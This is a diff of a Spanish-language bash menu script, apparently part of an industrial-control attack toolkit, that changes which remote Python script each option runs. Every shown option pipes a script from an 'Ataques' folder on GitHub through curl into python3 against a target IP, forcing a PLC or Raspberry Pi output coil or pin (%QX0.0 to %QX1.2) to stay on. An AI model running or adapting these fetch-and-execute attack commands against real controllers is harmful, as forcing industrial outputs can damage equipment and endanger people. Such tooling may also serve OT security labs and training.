@@ -54,7 +54,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX0.0..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.0'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX0.0'
 
         ;;
 
@@ -63,7 +63,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX0.1..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.1'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX0.1'
 
         ;;
 
@@ -72,7 +72,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX0.2..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.2'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX0.2'
 
         ;;
 
@@ -81,7 +81,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX0.3..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.3'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX0.3'
 
         ;;
 
@@ -90,7 +90,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX0.4..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.4'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX0.4'
 
         ;;
 
@@ -99,7 +99,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX0.5..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.5'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX0.5'
 
         ;;
 
@@ -108,7 +108,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX0.6..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.6'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX0.6'
 
         ;;
 
@@ -117,7 +117,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX0.7..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.7'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX0.7'
 
         ;;
 
@@ -126,7 +126,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX1.0..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.0'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX1.0'
 
         ;;
 
@@ -135,7 +135,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX1.1..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.1'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX1.1'
 
         ;;
 
@@ -144,7 +144,7 @@ vIP="$1"
           echo ""
           echo "  Manteniendo encendida la bobina de la dirección %QX1.2..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.2'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - "$vIP" '%QX1.2'
 
         ;;
 
